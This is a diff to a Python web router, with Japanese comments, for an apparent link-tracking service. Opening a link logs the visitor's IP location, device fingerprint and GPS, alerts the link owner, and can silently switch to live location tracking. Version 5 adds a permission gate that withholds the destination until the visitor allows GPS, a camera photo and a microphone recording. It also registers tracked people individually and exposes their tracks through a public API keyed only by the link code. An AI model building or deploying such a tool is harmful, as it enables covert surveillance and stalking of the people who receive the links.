@@ -1,16 +1,9 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。
 
-main.py の snsx と同じ場所で include する:
-    from . import tracks
-    app.include_router(tracks.router)
-
-/l/ 配下はこのモジュールが担当する（main.py の同名ルートより先に登録されるため）。
-認証・render・ヒット記録は main.py 側を遅延参照して使い回すので挙動がズレない。
-
-v4:
-  ・「要件ゲート」対応（開いた直後は要件だけ見せ、続けるで許可を取る）
-  ・ヒット時に通知（notify）を投げる
-  ・IP推定位置に「4G/5Gは不正確」の警告を付ける
+v5:
+  ・要件ゲート（名前＋メモ＋続ける）だけを最初に見せる
+  ・3つ全部許可のときだけ飛び先へ
+  ・生体認証などの追記事項を編集可能
 """
 from __future__ import annotations
 
@@ -29,6 +22,12 @@ LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
 TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
 
+GATE_EXTRA_DEFAULT = """・位置情報（GPS）を使用します
+・カメラで写真を1枚撮影します
+・マイクで数秒間録音します
+・顔認証（Face ID）や指紋認証などの生体認証は行いません
+・アプリのインストールや会員登録は不要です"""
+
 # ---------- 設定（画面 > 環境変数 > 既定） ----------
 
 LIVE_DEFAULTS = {
@@ -42,8 +41,12 @@ LIVE_DEFAULTS = {
     "deny_redirect": False,
     "dest_redirect": True,
     "promote_page": True,
-    "gate": True,          # 要件ゲートを出す
-    "gate_warn": True,     # 要件に「4G/5Gは不正確」を出す
+    "gate": True,
+    "gate_warn": True,
+    "gate_extra": GATE_EXTRA_DEFAULT,
+    "gate_copy": True,
+    "gate_link": False,
+    "require_all": True,
 }
 
 ENV_MAP = {
@@ -59,6 +62,10 @@ ENV_MAP = {
     "promote_page": "PROMOTE_PAGE_TO_LIVE",
     "gate": "LIVE_GATE",
     "gate_warn": "LIVE_GATE_WARN",
+    "gate_extra": "LIVE_GATE_EXTRA",
+    "gate_copy": "LIVE_GATE_COPY",
+    "gate_link": "LIVE_GATE_LINK",
+    "require_all": "LIVE_REQUIRE_ALL",
 }
 
 UI_CHOICES = ("", "none", "ask")
@@ -191,7 +198,6 @@ def _abs_dest(d):
 
 
 def _get_track(code):
-    """追跡として使えるリンクを返す。page として保存された分は live に昇格して救済。"""
     link = db.track_get(code)
     if link:
         return link
@@ -203,7 +209,6 @@ def _get_track(code):
 
 
 def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
-    """track_points 1行分。GPSが無ければIPの推定座標を入れる。"""
     lat = _f(q.get("lat") if q.get("lat") is not None else q.get("gps_lat"))
     lon = _f(q.get("lon") if q.get("lon") is not None else q.get("gps_lon"))
     if lat is not None and not (-90.0 <= lat <= 90.0):
@@ -257,10 +262,13 @@ def _live_page(request, code, hid, link, nonce):
                   dest_redirect=(L["dest_redirect"] and bool(dest)),
                   deny_redirect=(L["deny_redirect"] and bool(dest)),
                   dest_min=L["dest_min"],
-                  gate=bool(L["gate"]), gate_warn=bool(L["gate_warn"]))
+                  gate=bool(L["gate"]), gate_warn=bool(L["gate_warn"]),
+                  gate_extra=L["gate_extra"], gate_copy=bool(L["gate_copy"]),
+                  gate_link=bool(L["gate_link"]),
+                  require_all=bool(L["require_all"]))
 
 
-# ================= 公開ルート（/l/ 配下を引き継ぐ） =================
+# ================= 公開ルート =================
 
 @router.get("/l/{code}")
 def link_hit(code: str, request: Request):
@@ -272,7 +280,6 @@ def link_hit(code: str, request: Request):
     L = live_cfg()
     hid = _record_hit(request, code)
 
-    # ヒット通知
     try:
         from . import notify
         notify.hit_async(code, hid, request, link)
@@ -302,14 +309,12 @@ def link_hit(code: str, request: Request):
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
-    # 連続追跡モード（page として保存されたリンクは初回に live へ昇格）
     if mode == "live" or (mode == "page" and L["promote_page"]):
         if mode != "live":
             db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
             link = db.link_get(code) or link
         return _live_page(request, code, hid, link, nonce)
 
-    # 一瞬 / geo 用ランディング
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
                   dest=link["dest"] or "", nonce=nonce,
                   ask_text=L["ask_text"], go_text=L["go_text"],
@@ -371,7 +376,6 @@ async def link_extra(code: str, request: Request):
             fingerprint=str(body.get("fp") or "")[:128],
             pubkey=str(body.get("pubkey") or "")[:512])
 
-    # 一瞬タイプのGPSを追跡履歴にも残す
     link = db.track_get(code)
     if link and link["active"] and body.get("gps_lat") is not None:
         trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
@@ -385,7 +389,6 @@ async def link_extra(code: str, request: Request):
 
 @router.post("/l/{code}/p")
 async def link_point(code: str, request: Request):
-    """ライブ追跡の座標受信。バッチ可。重複は捨てる。"""
     if not _bind_owner(code):
         return {"ok": 0, "why": "noowner"}
     link = _get_track(code)
@@ -451,7 +454,6 @@ async def link_point(code: str, request: Request):
 
 @router.get("/api/track/{code}")
 def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
-    """追跡画面がポーリングする公開JSON。code が実質のパスワード。"""
     if not _bind_owner(code):
         raise HTTPException(404, "noowner")
     link = _get_track(code)
@@ -501,7 +503,7 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
     }
 
 
-# ================= 表示・文言の設定画面 =================
+# ================= 設定画面 =================
 
 @router.get("/livetrack", response_class=HTMLResponse)
 def live_settings_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
@@ -546,9 +548,15 @@ async def live_settings_save(request: Request, u=Depends(auth)):
         "promote_page": flag("promote_page"),
         "gate": flag("gate"),
         "gate_warn": flag("gate_warn"),
+        "gate_extra": s("gate_extra")[:800],
+        "gate_copy": flag("gate_copy"),
+        "gate_link": flag("gate_link"),
+        "require_all": flag("require_all"),
     }
     if data["ui"] not in UI_CHOICES:
         data["ui"] = ""
+    if not data["gate_extra"]:
+        data["gate_extra"] = GATE_EXTRA_DEFAULT
     _config.save_sections({"live": data})
     try:
         persist.push_user(u, force=True)
